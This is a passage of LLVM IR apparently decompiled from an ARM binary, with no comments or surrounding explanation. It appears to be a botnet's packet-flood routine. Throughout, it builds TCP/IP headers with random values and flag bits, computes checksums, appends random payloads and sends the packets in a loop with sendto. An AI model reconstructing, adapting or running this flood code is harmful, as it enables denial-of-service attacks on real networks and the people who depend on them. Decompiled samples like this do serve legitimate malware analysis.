  %v0_9e18 = load i32, i32* %r2.global-to-local, align 4
  %v1_9e18 = trunc i32 %v0_9e18 to i16
  %v2_9e18 = load i32, i32* @r4, align 4
  %v3_9e18 = add i32 %v2_9e18, 2
  %v4_9e18 = inttoptr i32 %v3_9e18 to i16*
  store i16 %v1_9e18, i16* %v4_9e18, align 2
  store i32 6, i32* %r3.global-to-local, align 4
  br i1 %v2_9e10, label %bb80, label %bb79

bb79:                                             ; preds = %dec_label_pc_9d3c
  store i32 64, i32* %r2.global-to-local, align 4
  br label %bb80

bb80:                                             ; preds = %dec_label_pc_9d3c, %bb79
  %v0_9e24 = load i32, i32* %r1.global-to-local, align 4
  %v1_9e24 = trunc i32 %v0_9e24 to i8
  %v2_9e24 = load i32, i32* @r4, align 4
  %v3_9e24 = add i32 %v2_9e24, 8
  %v4_9e24 = inttoptr i32 %v3_9e24 to i8*
  store i8 %v1_9e24, i8* %v4_9e24, align 1
  %v0_9e28 = load i32, i32* %r3.global-to-local, align 4
  %v1_9e28 = trunc i32 %v0_9e28 to i8
  %v2_9e28 = load i32, i32* @r4, align 4
  %v3_9e28 = add i32 %v2_9e28, 9
  %v4_9e28 = inttoptr i32 %v3_9e28 to i8*
  store i8 %v1_9e28, i8* %v4_9e28, align 1
  %v0_9e2c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_9e2c, label %bb82, label %bb81

bb81:                                             ; preds = %bb80
  %v1_9e2c = load i32, i32* %r2.global-to-local, align 4
  %v2_9e2c = trunc i32 %v1_9e2c to i16
  %v3_9e2c = load i32, i32* @r4, align 4
  %v4_9e2c = add i32 %v3_9e2c, 6
  %v5_9e2c = inttoptr i32 %v4_9e2c to i16*
  store i16 %v2_9e2c, i16* %v5_9e2c, align 2
  br label %bb82

bb82:                                             ; preds = %bb80, %bb81
  store i32 ptrtoint (i32* @global_var_2471c.58 to i32), i32* %r2.global-to-local, align 4
  %v2_9e34 = load i32, i32* @global_var_2471c.58, align 4
  store i32 %v2_9e34, i32* %r1.global-to-local, align 4
  %v1_9e38 = load i32, i32* @r4, align 4
  %v2_9e38 = add i32 %v1_9e38, 12
  %v3_9e38 = inttoptr i32 %v2_9e38 to i32*
  store i32 %v2_9e34, i32* %v3_9e38, align 4
  %v3_9e3c = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_9e3c, i32* %r3.global-to-local, align 4
  store i32 %v2_9918, i32* %ip.global-to-local, align 4
  %v4_9e44 = mul i32 %v3_9e3c, 16
  %v5_9e44 = add i32 %v4_9e44, %v2_9918
  %v6_9e44 = inttoptr i32 %v5_9e44 to i32*
  %v7_9e44 = load i32, i32* %v6_9e44, align 4
  store i32 %v7_9e44, i32* %r2.global-to-local, align 4
  store i32 %v5_9e44, i32* %r3.global-to-local, align 4
  %v1_9e50 = load i32, i32* @r4, align 4
  %v2_9e50 = add i32 %v1_9e50, 16
  %v3_9e50 = inttoptr i32 %v2_9e50 to i32*
  store i32 %v7_9e44, i32* %v3_9e50, align 4
  %v0_9e54 = load i32, i32* %r3.global-to-local, align 4
  %v1_9e54 = add i32 %v0_9e54, 12
  %v2_9e54 = inttoptr i32 %v1_9e54 to i16*
  %v3_9e54 = load i16, i16* %v2_9e54, align 2
  %v4_9e54 = zext i16 %v3_9e54 to i32
  store i32 %v4_9e54, i32* %r0.global-to-local, align 4
  %v1_9e58 = add i32 %v0_9e54, 8
  %v2_9e58 = inttoptr i32 %v1_9e58 to i32*
  %v3_9e58 = load i32, i32* %v2_9e58, align 4
  store i32 %v3_9e58, i32* %r1.global-to-local, align 4
  %v2_9e5c = load i32, i32* @r4, align 4
  %v3_9e5c = add i32 %v2_9e5c, 20
  %v4_9e5c = inttoptr i32 %v3_9e5c to i16*
  store i16 %v3_9e54, i16* %v4_9e5c, align 2
  %v0_9e60 = load i32, i32* @r4, align 4
  %v1_9e60 = add i32 %v0_9e60, 20
  store i32 %v1_9e60, i32* @r8, align 4
  %v1_9e64 = add i32 %v0_9e60, 33
  %v2_9e64 = inttoptr i32 %v1_9e64 to i8*
  %v3_9e64 = load i8, i8* %v2_9e64, align 1
  %v4_9e64 = zext i8 %v3_9e64 to i32
  store i32 %v4_9e64, i32* %r2.global-to-local, align 4
  %v0_9e68 = load i32, i32* %r1.global-to-local, align 4
  %v2_9e68 = add i32 %v0_9e60, 24
  %v3_9e68 = inttoptr i32 %v2_9e68 to i32*
  store i32 %v0_9e68, i32* %v3_9e68, align 4
  %v0_9e6c = load i32, i32* %r2.global-to-local, align 4
  %v1_9e6c = or i32 %v0_9e6c, 1
  store i32 %v1_9e6c, i32* %r2.global-to-local, align 4
  %v0_9e70 = load i32, i32* %r3.global-to-local, align 4
  %v1_9e70 = add i32 %v0_9e70, 4
  %v2_9e70 = inttoptr i32 %v1_9e70 to i32*
  %v3_9e70 = load i32, i32* %v2_9e70, align 4
  store i32 %v3_9e70, i32* %r1.global-to-local, align 4
  %v1_9e74 = add i32 %v0_9e70, 14
  %v2_9e74 = inttoptr i32 %v1_9e74 to i16*
  %v3_9e74 = load i16, i16* %v2_9e74, align 2
  %v4_9e74 = zext i16 %v3_9e74 to i32
  store i32 %v4_9e74, i32* %r3.global-to-local, align 4
  %v1_9e78 = trunc i32 %v1_9e6c to i8
  %v2_9e78 = load i32, i32* @r8, align 4
  %v3_9e78 = add i32 %v2_9e78, 13
  %v4_9e78 = inttoptr i32 %v3_9e78 to i8*
  store i8 %v1_9e78, i8* %v4_9e78, align 1
  %v0_9e7c = load i32, i32* %r3.global-to-local, align 4
  %v1_9e7c = trunc i32 %v0_9e7c to i16
  %v2_9e7c = load i32, i32* @r8, align 4
  %v3_9e7c = add i32 %v2_9e7c, 2
  %v4_9e7c = inttoptr i32 %v3_9e7c to i16*
  store i16 %v1_9e7c, i16* %v4_9e7c, align 2
  %v0_9e80 = load i32, i32* @r8, align 4
  %v1_9e80 = add i32 %v0_9e80, 12
  %v2_9e80 = inttoptr i32 %v1_9e80 to i8*
  %v3_9e80 = load i8, i8* %v2_9e80, align 1
  %v4_9e80 = zext i8 %v3_9e80 to i32
  store i32 %v4_9e80, i32* %r3.global-to-local, align 4
  %v1_9e84 = add i32 %v0_9e80, 13
  %v2_9e84 = inttoptr i32 %v1_9e84 to i8*
  %v3_9e84 = load i8, i8* %v2_9e84, align 1
  %v4_9e84 = zext i8 %v3_9e84 to i32
  %tmp104 = urem i8 %v3_9e80, 16
  %v1_9e88 = zext i8 %tmp104 to i32
  %v1_9e8c = or i32 %v1_9e88, 128
  store i32 %v1_9e8c, i32* %r3.global-to-local, align 4
  %v1_9e90 = or i32 %v4_9e84, 16
  store i32 %v1_9e90, i32* %r2.global-to-local, align 4
  %v0_9e94 = load i32, i32* %r1.global-to-local, align 4
  %v2_9e94 = add i32 %v0_9e80, 8
  %v3_9e94 = inttoptr i32 %v2_9e94 to i32*
  store i32 %v0_9e94, i32* %v3_9e94, align 4
  %v0_9e98 = load i32, i32* %r3.global-to-local, align 4
  %v1_9e98 = trunc i32 %v0_9e98 to i8
  %v2_9e98 = load i32, i32* @r8, align 4
  %v3_9e98 = add i32 %v2_9e98, 12
  %v4_9e98 = inttoptr i32 %v3_9e98 to i8*
  store i8 %v1_9e98, i8* %v4_9e98, align 1
  %v0_9e9c = load i32, i32* %r2.global-to-local, align 4
  %v1_9e9c = trunc i32 %v0_9e9c to i8
  %v2_9e9c = load i32, i32* @r8, align 4
  %v3_9e9c = add i32 %v2_9e9c, 13
  %v4_9e9c = inttoptr i32 %v3_9e9c to i8*
  store i8 %v1_9e9c, i8* %v4_9e9c, align 1
  %v0_9ea0 = call i32 @rand_next()
  %v1_9ea0 = trunc i32 %v0_9ea0 to i16
  store i32 %v0_9ea0, i32* %r0.global-to-local, align 4
  store i32 %v1_99e4, i32* %r1.global-to-local, align 4
  %v0_9ea8 = load i32, i32* @r8, align 4
  %v1_9ea8 = add i32 %v0_9ea8, 13
  %v2_9ea8 = inttoptr i32 %v1_9ea8 to i8*
  %v3_9ea8 = load i8, i8* %v2_9ea8, align 1
  %v4_9ea8 = zext i8 %v3_9ea8 to i32
  store i32 %v1_9eac, i32* %r2.global-to-local, align 4
  %v1_9eb0 = and i32 %v4_9ea8, 223
  %v5_9eb4 = or i32 %v1_9eb0, %v4_9eb4
  store i32 %v5_9eb4, i32* %r3.global-to-local, align 4
  %v1_9eb8 = trunc i32 %v5_9eb4 to i8
  store i8 %v1_9eb8, i8* %v2_9ea8, align 1
  store i32 %v1_9a04, i32* %ip.global-to-local, align 4
  %v0_9ec0 = load i32, i32* @r8, align 4
  %v1_9ec0 = add i32 %v0_9ec0, 13
  %v2_9ec0 = inttoptr i32 %v1_9ec0 to i8*
  %v3_9ec0 = load i8, i8* %v2_9ec0, align 1
  %v4_9ec0 = zext i8 %v3_9ec0 to i32
  store i32 %v1_9ec4, i32* %r3.global-to-local, align 4
  %v1_9ec8 = and i32 %v4_9ec0, 239
  %v5_9ecc = or i32 %v1_9ec8, %v4_9ecc
  store i32 %v5_9ecc, i32* %r2.global-to-local, align 4
  %v1_9ed0 = trunc i32 %v5_9ecc to i8
  store i8 %v1_9ed0, i8* %v2_9ec0, align 1
  store i32 %v1_9a24, i32* %r1.global-to-local, align 4
  %v0_9ed8 = load i32, i32* @r8, align 4
  %v1_9ed8 = add i32 %v0_9ed8, 13
  %v2_9ed8 = inttoptr i32 %v1_9ed8 to i8*
  %v3_9ed8 = load i8, i8* %v2_9ed8, align 1
  %v4_9ed8 = zext i8 %v3_9ed8 to i32
  store i32 %v1_9edc, i32* %r2.global-to-local, align 4
  %v1_9ee0 = and i32 %v4_9ed8, 247
  %v5_9ee4 = or i32 %v1_9ee0, %v4_9ee4
  store i32 %v5_9ee4, i32* %r3.global-to-local, align 4
  %v1_9ee8 = trunc i32 %v5_9ee4 to i8
  store i8 %v1_9ee8, i8* %v2_9ed8, align 1
  store i32 %v1_9a44, i32* %ip.global-to-local, align 4
  %v0_9ef0 = load i32, i32* @r8, align 4
  %v1_9ef0 = add i32 %v0_9ef0, 13
  %v2_9ef0 = inttoptr i32 %v1_9ef0 to i8*
  %v3_9ef0 = load i8, i8* %v2_9ef0, align 1
  %v4_9ef0 = zext i8 %v3_9ef0 to i32
  store i32 %v1_9ef4, i32* %r3.global-to-local, align 4
  %v1_9ef8 = and i32 %v4_9ef0, 251
  %v5_9efc = or i32 %v1_9ef8, %v4_9efc
  store i32 %v5_9efc, i32* %r2.global-to-local, align 4
  %v1_9f00 = trunc i32 %v5_9efc to i8
  store i8 %v1_9f00, i8* %v2_9ef0, align 1
  store i32 %v1_9a64, i32* %r1.global-to-local, align 4
  %v0_9f08 = load i32, i32* @r8, align 4
  %v1_9f08 = add i32 %v0_9f08, 13
  %v2_9f08 = inttoptr i32 %v1_9f08 to i8*
  %v3_9f08 = load i8, i8* %v2_9f08, align 1
  %v4_9f08 = zext i8 %v3_9f08 to i32
  store i32 %v1_9f0c, i32* %r2.global-to-local, align 4
  %v1_9f10 = and i32 %v4_9f08, 253
  %v4_9f14 = or i32 %v1_9f10, %v3_9f14
  store i32 %v4_9f14, i32* %r3.global-to-local, align 4
  %v1_9f18 = trunc i32 %v4_9f14 to i8
  store i8 %v1_9f18, i8* %v2_9f08, align 1
  store i32 %v1_9a84, i32* %ip.global-to-local, align 4
  %v0_9f20 = load i32, i32* @r8, align 4
  %v1_9f20 = add i32 %v0_9f20, 13
  %v2_9f20 = inttoptr i32 %v1_9f20 to i8*
  %v3_9f20 = load i8, i8* %v2_9f20, align 1
  %v4_9f20 = zext i8 %v3_9f20 to i32
  %v1_9f28 = and i32 %v4_9f20, 254
  store i32 %v1_9f28, i32* %r2.global-to-local, align 4
  %v2_9f2c = or i32 %v1_9f28, %v1_9f24
  store i32 %v2_9f2c, i32* %r3.global-to-local, align 4
  %v1_9f30 = trunc i32 %v2_9f2c to i8
  store i8 %v1_9f30, i8* %v2_9f20, align 1
  %v3_9f34 = load i32, i32* @r8, align 4
  %v4_9f34 = add i32 %v3_9f34, 14
  %v5_9f34 = inttoptr i32 %v4_9f34 to i16*
  store i16 %v1_9ea0, i16* %v5_9f34, align 2
  store i32 %v6_9a9c, i32* %r1.global-to-local, align 4
  %v0_9f3c = load i32, i32* @r4, align 4
  %v1_9f3c = add i32 %v0_9f3c, 40
  store i32 %v1_9f3c, i32* %r0.global-to-local, align 4
  %v2_9f40 = inttoptr i32 %v1_9f3c to i16*
  %v3_9f40 = call i32 @rand_str(i16* %v2_9f40, i32 %v6_9a9c)
  store i32 %v3_9f40, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_9c94

dec_label_pc_9f48:                                ; preds = %dec_label_pc_9b08
  store i32 %v6_9a9c, i32* %r1.global-to-local, align 4
  %.pre = add i32 %v6_9a9c, 40
  br label %dec_label_pc_9f58

dec_label_pc_9f58:                                ; preds = %dec_label_pc_9ca8, %dec_label_pc_9f48
  %storemerge6.pre-phi = phi i32 [ %v1_9d98, %dec_label_pc_9ca8 ], [ %.pre, %dec_label_pc_9f48 ]
  %v0_9f6c26 = phi i32 [ %v1_9c9c, %dec_label_pc_9ca8 ], [ 0, %dec_label_pc_9f48 ]
  store i32 %storemerge6.pre-phi, i32* @r7, align 4
  %storemerge4 = mul i32 %v6_9a9c, 65536
  %storemerge = add i32 %v6_9a9c, 20
  store i32 %storemerge, i32* @sl, align 4
  %v1_9f58 = add i32 %storemerge4, 1310720
  store i32 %v1_9f58, i32* %r2.global-to-local, align 4
  %tmp83 = udiv i32 %v1_9f58, 256
  %v3_9f60 = and i32 %tmp83, 65280
  store i32 %v3_9f60, i32* %r3.global-to-local, align 4
  %v4_9f64 = udiv i32 %v1_9f58, 16777216
  %v5_9f64 = or i32 %v3_9f60, %v4_9f64
  store i32 %v5_9f64, i32* @r8, align 4
  %v2_a090 = icmp eq i32 %v1_9abc, 0
  br label %dec_label_pc_9f68

dec_label_pc_9f68:                                ; preds = %dec_label_pc_9f68, %dec_label_pc_a074, %dec_label_pc_9f58
  %v0_9f6c = phi i32 [ %v0_9f6c26, %dec_label_pc_9f58 ], [ 0, %dec_label_pc_a074 ], [ 0, %dec_label_pc_9f68 ]
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_9f6c = icmp eq i32 %v0_9f6c, 0
  store i1 %v2_9f6c, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_9f6c, label %dec_label_pc_9f68, label %dec_label_pc_9f78

dec_label_pc_9f78:                                ; preds = %dec_label_pc_9f68, %dec_label_pc_a074
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_9f7c

dec_label_pc_9f7c:                                ; preds = %dec_label_pc_9fa4, %dec_label_pc_9f78
  %v1_9f84 = phi i32 [ %v1_a064, %dec_label_pc_9fa4 ], [ 0, %dec_label_pc_9f78 ]
  store i32 %v2_9928, i32* %r2.global-to-local, align 4
  store i32 65536, i32* %r3.global-to-local, align 4
  %v4_9f84 = mul i32 %v1_9f84, 4
  %v5_9f84 = add i32 %v4_9f84, %v2_9928
  %v6_9f84 = inttoptr i32 %v5_9f84 to i32*
  %v7_9f84 = load i32, i32* %v6_9f84, align 4
  store i32 %v7_9f84, i32* @r4, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  %v0_9f8c = load i32, i32* @fp, align 4
  %v9_9f8c = icmp eq i32 %v0_9f8c, 65535
  store i1 %v9_9f8c, i1* %cpsr_z.global-to-local, align 1
  %v1_9f90 = add i32 %v7_9f84, 20
  store i32 %v1_9f90, i32* @r5, align 4
  br i1 %v9_9f8c, label %dec_label_pc_a088, label %dec_label_pc_9f98

dec_label_pc_9f98:                                ; preds = %dec_label_pc_9f7c
  store i32 %v1_9abc, i32* %r3.global-to-local, align 4
  store i1 %v2_a090, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_a090, label %dec_label_pc_9fa4, label %dec_label_pc_a09c

dec_label_pc_9fa4:                                ; preds = %dec_label_pc_9f98, %dec_label_pc_a088, %dec_label_pc_a09c
  store i32 0, i32* %ip.global-to-local, align 4
  %v2_9fa8 = load i32, i32* @r4, align 4
  %v3_9fa8 = add i32 %v2_9fa8, 10
  %v4_9fa8 = inttoptr i32 %v3_9fa8 to i16*
  store i16 0, i16* %v4_9fa8, align 2
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_9fb0 = load i32, i32* @r4, align 4
  store i32 %v0_9fb0, i32* @r0, align 4
  %v2_9fb4 = call i32 @checksum_generic(i32 %v0_9fb0, i32 20)
  %v3_9fb4 = trunc i32 %v2_9fb4 to i16
  store i32 %v2_9fb4, i32* %r0.global-to-local, align 4
  %v3_9fb8 = load i32, i32* %stack_var_-44, align 4
  store i32 %v2_9918, i32* %r2.global-to-local, align 4
  %v3_9fc0 = mul i32 %v3_9fb8, 16
  %v2_9fc4 = add i32 %v3_9fc0, %v2_9918
  store i32 %v2_9fc4, i32* %r1.global-to-local, align 4
  %v1_9fc8 = add i32 %v2_9fc4, 4
  %v2_9fc8 = inttoptr i32 %v1_9fc8 to i32*
  %v3_9fc8 = load i32, i32* %v2_9fc8, align 4
  %v3_9fcc = mul i32 %v3_9fc8, 65536
  store i32 %v3_9fcc, i32* %ip.global-to-local, align 4
  %tmp85 = mul i32 %v3_9fc8, 256
  %v1_9fd4 = and i32 %tmp85, 65280
  %tmp86 = udiv i32 %v3_9fc8, 256
  %v4_9fd8 = urem i32 %tmp86, 256
  %v5_9fd8 = or i32 %v4_9fd8, %v1_9fd4
  store i32 %v5_9fd8, i32* %r3.global-to-local, align 4
  %v1_9fdc = add i32 %v3_9fc8, 1
  store i32 %v1_9fdc, i32* %r2.global-to-local, align 4
  store i32 %v1_9fdc, i32* %v2_9fc8, align 4
  %v0_9fe4 = load i32, i32* %r3.global-to-local, align 4
  %v1_9fe4 = load i32, i32* @r5, align 4
  %v2_9fe4 = add i32 %v1_9fe4, 4
  %v3_9fe4 = inttoptr i32 %v2_9fe4 to i32*
  store i32 %v0_9fe4, i32* %v3_9fe4, align 4
  %v0_9fe8 = load i32, i32* %r1.global-to-local, align 4
  %v1_9fe8 = add i32 %v0_9fe8, 8
  %v2_9fe8 = inttoptr i32 %v1_9fe8 to i32*
  %v3_9fe8 = load i32, i32* %v2_9fe8, align 4
  %tmp87 = mul i32 %v3_9fe8, 256
  %v1_9ff4 = and i32 %tmp87, 65280
  %tmp88 = udiv i32 %v3_9fe8, 256
  %v4_9ff8 = urem i32 %tmp88, 256
  %v5_9ff8 = or i32 %v4_9ff8, %v1_9ff4
  %v1_9ffc = load i32, i32* @r5, align 4
  %v2_9ffc = add i32 %v1_9ffc, 8
  %v3_9ffc = inttoptr i32 %v2_9ffc to i32*
  store i32 %v5_9ff8, i32* %v3_9ffc, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_a004 = load i32, i32* @r4, align 4
  %v4_a004 = add i32 %v3_a004, 10
  %v5_a004 = inttoptr i32 %v4_a004 to i16*
  store i16 %v3_9fb4, i16* %v5_a004, align 2
  %v0_a008 = load i32, i32* @r5, align 4
  store i32 %v0_a008, i32* @r1, align 4
  %v0_a00c = load i32, i32* %r3.global-to-local, align 4
  %v1_a00c = trunc i32 %v0_a00c to i16
  %v3_a00c = add i32 %v0_a008, 16
  %v4_a00c = inttoptr i32 %v3_a00c to i16*
  store i16 %v1_a00c, i16* %v4_a00c, align 2
  %v0_a010 = load i32, i32* @r8, align 4
  store i32 %v0_a010, i32* %r2.global-to-local, align 4
  %v0_a014 = load i32, i32* @sl, align 4
  store i32 %v0_a014, i32* %r3.global-to-local, align 4
  %v0_a018 = load i32, i32* @r4, align 4
  store i32 %v0_a018, i32* %r0.global-to-local, align 4
  %v4_a01c = call i32 @checksum_tcpudp(i32 %v0_a018, i32 %v0_a008, i32 %v0_a010, i32 %v0_a014)
  %v5_a01c = trunc i32 %v4_a01c to i16
  store i32 %v4_a01c, i32* %r0.global-to-local, align 4
  %v3_a020 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_a020, i32* %r3.global-to-local, align 4
  store i32 %arg2, i32* %ip.global-to-local, align 4
  %v3_a028 = mul i32 %v3_a020, 32
  store i32 %v3_a028, i32* %lr.global-to-local, align 4
  %v3_a02c = load i32, i32* @r5, align 4
  %v4_a02c = add i32 %v3_a02c, 16
  %v5_a02c = inttoptr i32 %v4_a02c to i16*
  store i16 %v5_a01c, i16* %v5_a02c, align 2
  %v0_a030 = load i32, i32* %lr.global-to-local, align 4
  %v1_a030 = load i32, i32* %r3.global-to-local, align 4
  %tmp105 = mul i32 %v1_a030, -8
  %v5_a030 = add i32 %v0_a030, %tmp105
  store i32 %v5_a030, i32* %lr.global-to-local, align 4
  %v0_a034 = load i32, i32* @r5, align 4
  %v1_a034 = add i32 %v0_a034, 2
  %v2_a034 = inttoptr i32 %v1_a034 to i16*
  %v3_a034 = load i16, i16* %v2_a034, align 2
  %v4_a034 = zext i16 %v3_a034 to i32
  store i32 %v4_a034, i32* @r5, align 4
  %v1_a038 = load i32, i32* %ip.global-to-local, align 4
  %v2_a038 = add i32 %v1_a038, %v5_a030
  store i32 %v2_a038, i32* @lr, align 4
  %v3_a03c = add i32 %v2_a038, 2
  %v4_a03c = inttoptr i32 %v3_a03c to i16*
  store i16 %v3_a034, i16* %v4_a03c, align 2
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 16, i32* %ip.global-to-local, align 4
  %v0_a048 = load i32, i32* @r4, align 4
  store i32 %v0_a048, i32* %r1.global-to-local, align 4
  %v0_a04c = load i32, i32* @sb, align 4
  store i32 %v0_a04c, i32* %r0.global-to-local, align 4
  %v0_a050 = load i32, i32* @r7, align 4
  store i32 %v0_a050, i32* %r2.global-to-local, align 4
  %v0_a054 = load i32, i32* @lr, align 4
  %v6_a05c = call i32 @__libc_sendto(i32 %v0_a04c, i32 %v0_a048, i32 %v0_a050, i32 16384, i32 %v0_a054, i32 16)
  %v3_a060 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_a060, i32* %r3.global-to-local, align 4
  %v1_a064 = add i32 %v3_a060, 1
  store i32 %v1_a064, i32* %r0.global-to-local, align 4
  %v0_a068 = load i32, i32* @r6, align 4
  %v9_a068 = icmp eq i32 %v0_a068, %v1_a064
  store i1 %v9_a068, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_a064, i32* %stack_var_-44, align 4
  %v8_a070 = icmp sgt i32 %v0_a068, %v1_a064
  br i1 %v8_a070, label %dec_label_pc_9f7c, label %dec_label_pc_a074

dec_label_pc_a074:                                ; preds = %dec_label_pc_9fa4
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_a078 = icmp eq i32 %v0_a068, 0
  store i1 %v2_a078, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_a078, label %dec_label_pc_9f68, label %dec_label_pc_9f78

dec_label_pc_a088:                                ; preds = %dec_label_pc_9f7c
  %v0_a088 = call i32 @rand_next()
  %v1_a088 = trunc i32 %v0_a088 to i16
  store i32 %v0_a088, i32* %r0.global-to-local, align 4
  store i32 %v1_9abc, i32* %r3.global-to-local, align 4
  store i1 %v2_a090, i1* %cpsr_z.global-to-local, align 1
  %v3_a094 = load i32, i32* @r4, align 4
  %v4_a094 = add i32 %v3_a094, 4
  %v5_a094 = inttoptr i32 %v4_a094 to i16*
  store i16 %v1_a088, i16* %v5_a094, align 2
  br i1 %v2_a090, label %dec_label_pc_9fa4, label %dec_label_pc_a088.dec_label_pc_a09c_crit_edge

dec_label_pc_a088.dec_label_pc_a09c_crit_edge:    ; preds = %dec_label_pc_a088
  %v0_a09c.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_a09c

dec_label_pc_a09c:                                ; preds = %dec_label_pc_a088.dec_label_pc_a09c_crit_edge, %dec_label_pc_9f98
  %v0_a09c = phi i32 [ %v0_a09c.pre, %dec_label_pc_a088.dec_label_pc_a09c_crit_edge ], [ %v7_9f84, %dec_label_pc_9f98 ]
  %v1_a09c = add i32 %v0_a09c, 40
  store i32 %v1_a09c, i32* %r0.global-to-local, align 4
  store i32 %v6_9a9c, i32* %r1.global-to-local, align 4
  %v2_a0a4 = inttoptr i32 %v1_a09c to i16*
  %v3_a0a4 = call i32 @rand_str(i16* %v2_a0a4, i32 %v6_9a9c)
  store i32 %v3_a0a4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_9fa4

; uselistorder directives
  uselistorder i32 %v0_a088, { 1, 0 }
  uselistorder i32 %v1_a064, { 2, 0, 3, 4, 1 }
  uselistorder i32 %v5_a030, { 1, 0 }
  uselistorder i32 %v4_a01c, { 1, 0 }
  uselistorder i32 %v3_9fe8, { 1, 0 }
  uselistorder i32 %v3_9fc8, { 3, 2, 0, 1 }
  uselistorder i32 %v2_9fb4, { 1, 0 }
  uselistorder i1 %v2_a090, { 2, 3, 1, 0 }
  uselistorder i32 %v0_9ea0, { 1, 0 }
  uselistorder i32 %v0_9dd8, { 1, 0 }
  uselistorder i32 %v5_9d6c, { 1, 0 }
  uselistorder i32 %v0_9d2c, { 1, 0 }
  uselistorder i32 %v0_9ce8, { 1, 2, 0, 3 }
  uselistorder i32 %v1_9c98, { 1, 0, 2, 3 }
  uselistorder i32 %v3_9c84, { 1, 0, 3, 4, 2 }
  uselistorder i1 %v7_9c10, { 1, 0 }
  uselistorder i32 %v6_9c08, { 0, 2, 1, 3 }
  uselistorder i1 %v9_9c38, { 1, 0 }
  uselistorder i32 %v4_9c4c, { 1, 0 }
  uselistorder i16 %stack_var_-62.2, { 0, 1, 3, 2 }
  uselistorder i32 %v0_9b94, { 1, 0, 2 }
  uselistorder i32 %v0_9d44, { 1, 0, 2, 4, 5, 3 }
  uselistorder i32 %v4_9b84, { 1, 0 }
  uselistorder i1 %v7_9b7c, { 1, 0, 2 }
  uselistorder i1 %v7_9b30, { 1, 0 }
  uselistorder i32 %v3_9b2c, { 1, 2, 0, 3 }
  uselistorder i32 %stack_var_-60.0, { 1, 0 }
  uselistorder i16 %stack_var_-62.0, { 1, 0 }
  uselistorder i32 %v1_9f0c, { 1, 0 }
  uselistorder i32 %v1_9ef4, { 1, 0 }
  uselistorder i32 %v1_9edc, { 1, 0 }
  uselistorder i32 %v1_9ec4, { 1, 0 }
  uselistorder i32 %v1_9eac, { 1, 0 }
  uselistorder i32 %v3_9c44, { 1, 0 }
  uselistorder i1 %v2_9c60, { 1, 0 }
  uselistorder i32 %v1_9c5c, { 1, 0 }
  uselistorder i32 %v4_9c58, { 2, 0, 1 }
  uselistorder i32 %v2_9b6c, { 3, 2, 1, 4, 0 }
  uselistorder i32 %v0_9b08, { 1, 0 }
  uselistorder i1 %v7_9b00, { 1, 0 }
  uselistorder i1 %v7_9ad4, { 1, 0 }
  uselistorder i32 %v3_9ad0, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v1_9abc, { 2, 3, 1, 0 }
  uselistorder i32 %v6_9a9c, { 9, 8, 2, 0, 1, 10, 5, 4, 6, 7, 3 }
  uselistorder i32 %v1_9a84, { 1, 2, 0 }
  uselistorder i32 %v1_9a64, { 1, 2, 0 }
  uselistorder i32 %v1_9a44, { 1, 2, 0 }
  uselistorder i32 %v1_9a24, { 1, 2, 0 }
  uselistorder i32 %v1_9a04, { 1, 2, 0 }
  uselistorder i32 %v1_99e4, { 1, 2, 0 }
  uselistorder i32 %v6_99c0, { 1, 0 }
  uselistorder i32 %v1_99a8, { 1, 2, 0 }
  uselistorder i32 %v6_9940, { 2, 1, 3, 0 }
  uselistorder i32 %v2_9928, { 0, 3, 1, 2, 4 }
  uselistorder i32 %v2_9918, { 0, 7, 1, 4, 2, 5, 3, 6 }
  uselistorder i32* %stack_var_-44, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 15, 14 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 21, 20, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 33, 32, 34, 35, 36, 37, 38, 39, 40, 41, 43, 42, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 44, 43, 45, 47, 46, 48, 50, 49, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 1, 4, 3, 5, 7, 6, 9, 8, 11, 10, 16, 12, 13, 14, 15, 19, 17, 18, 21, 20, 22, 25, 24, 23, 26, 27, 28, 30, 31, 29, 32, 34, 33, 35, 36, 37, 39, 38, 40, 42, 41, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 0 }
  uselistorder i32* %ip.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 0, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32 }
  uselistorder i1* %cpsr_z.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 15, 0, 16, 17, 14, 18, 19, 20, 21, 22, 23 }
